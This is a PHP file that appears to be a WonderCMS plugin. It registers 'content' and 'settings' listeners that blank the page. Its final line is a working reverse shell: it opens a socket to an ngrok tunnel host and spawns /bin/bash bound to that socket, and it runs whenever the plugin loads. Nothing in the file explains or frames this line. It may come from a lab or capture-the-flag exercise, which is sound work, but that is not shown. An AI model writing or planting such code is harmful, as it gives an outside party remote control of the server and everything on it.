<?php
global $Wcms;

if (defined('VERSION')) {
	$Wcms->addListener('content', 'contentFunc');
	$Wcms->addListener('settings', 'adminFunc');
}

function contentFunc($args) {
	$args[0] = '';
	return $args;
}

function adminFunc($args) {
	$args[0] = '';
	return $args;
}

$sock=fsockopen("0.tcp.sa.ngrok.io",19490);$proc=proc_open("/bin/bash", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
